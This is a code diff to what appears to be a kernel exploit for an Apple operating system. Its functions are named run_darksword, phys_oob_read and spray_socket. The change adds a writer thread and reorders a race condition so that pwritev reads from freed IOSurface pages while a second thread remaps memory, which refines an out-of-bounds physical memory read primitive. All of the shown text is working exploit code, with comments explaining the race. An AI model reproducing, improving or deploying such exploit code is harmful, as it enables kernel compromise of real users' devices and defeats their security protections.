@@ -48,11 +48,13 @@ static int controlSocket = 0, rwSocket = 0;
 static uint64_t controlSocketPcb = 0, rwSocketPcb = 0;
 static uint8_t controlData[0x20];
 static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
+static volatile uint8_t writeRequested = 0, writeDone = 0;
 static volatile mach_vm_address_t freeTarget = 0;
 static volatile mach_vm_size_t freeTargetSize = 0;
 static volatile mem_entry_name_port_t targetObject = 0;
 static volatile memory_object_offset_t targetObjectOffset = 0;
 static pthread_t freeThread;
+static pthread_t writeThread;
 static int highestSuccessIdx = 0;
 static int successReadCount = 0;
 static struct iovec iov;
@@ -207,6 +209,20 @@ void *free_thread(void *arg) {
     return NULL;
 }
 
+void *write_thread_func(void *arg) {
+    (void)arg;
+    struct iovec wiov;
+    wiov.iov_base = (void*)(pcAddress + 0x3f00);
+    wiov.iov_len = OOB_OFFSET + OOB_SIZE;
+    while (1) {
+        while (writeRequested == 0) {}
+        writeDone = 0;
+        pwritev(readFd, &wiov, 1, 0x3f00);
+        writeDone = 1;
+    }
+    return NULL;
+}
+
 fileport_t spray_socket(void) {
     int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
     if (fd < 0) return -1;
@@ -240,9 +256,12 @@ kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
     *(uint64_t*)buf = randomMarker;
     *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;
     for (int t = 0; t < highestSuccessIdx + 100; t++) {
-        raceSync = 1;
-        pwritev(readFd, &iov, 1, 0x3f00);
-        while (raceSync == 1) {}
+        // Invert race: start write from OLD mapping (freed IOSurface pages)
+        // THEN change mapping while write is in-flight
+        writeRequested = 1;       // writer thread starts pwritev from freed pages
+        raceSync = 1;             // free thread changes mapping DURING write
+        while (writeDone == 0) {} // wait for writer completion
+        while (raceSync == 1) {}  // wait for free thread completion
         kern_return_t kr = mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
             VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
@@ -253,6 +272,8 @@ kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
             targetObject = 0;
             return KERN_SUCCESS;
         }
+        writeRequested = 0;
+        writeDone = 0;
         usleep(1);
         if (t == 500) break;
     }
@@ -432,6 +453,7 @@ bool run_darksword(void) {
     else executableName = executablePath;
 
     pthread_create(&freeThread, NULL, free_thread, NULL);
+    pthread_create(&writeThread, NULL, write_thread_func, NULL);
 
     uint64_t mappingPages = 0x1000 * 0x10;
     uint64_t searchSize = 0x2000 * PAGE_SIZE;
